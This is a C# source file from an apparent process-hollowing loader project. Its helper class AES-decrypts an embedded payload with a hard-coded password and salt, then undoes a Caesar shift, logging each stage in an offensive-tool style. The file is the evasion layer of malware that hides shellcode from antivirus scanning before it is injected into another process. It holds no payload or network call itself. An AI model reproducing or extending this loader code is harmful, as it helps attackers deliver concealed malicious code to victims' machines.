using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace ProcessHollowingExe
{
    public class PFuncs
    {

        private static byte[] AesDecrypt(byte[] input)
        {
            try
            {
                var pdb =
                    new PasswordDeriveBytes("ic34xe!!!",
                        new byte[] { 0x67, 0x65, 0x74, 0x66, 0x75, 0x63, 0x6b, 0x65, 0x64 });
                var ms = new MemoryStream();
                Aes aes = new AesManaged();
                aes.KeySize = 256;
                aes.Key = pdb.GetBytes(aes.KeySize / 8);
                aes.IV = pdb.GetBytes(aes.BlockSize / 8);
                var cs = new CryptoStream(ms,
                    aes.CreateDecryptor(), CryptoStreamMode.Write);
                cs.Write(input, 0, input.Length);
                cs.Close();
                Console.WriteLine("[+] Successfully Decrypted AES Payload.");
                return ms.ToArray();
            }
            catch (Exception e)
            {
                Console.WriteLine($"[-] FAILED Decrypting AES Payload!: {e.Message}");
                throw;
            }
        }

        public static byte[] CaesarDecrypt(byte[] buffer)
        {
            Console.WriteLine($"[+] Decrypting AES Payload.");
            var decrypted = AesDecrypt(buffer);

            Console.WriteLine($"[+] Decoding Caesar Encoded Payload.");
            var decoded = new byte[decrypted.Length];

            for (var i = 0; i < decrypted.Length; i++)
            {
                decoded[i] = (byte)(((uint)decrypted[i] - 5) & 0xFF);
            }

            Console.WriteLine($"[+] Successfully Decoded Caesar Payload.");
            return decoded;
        }
    }
}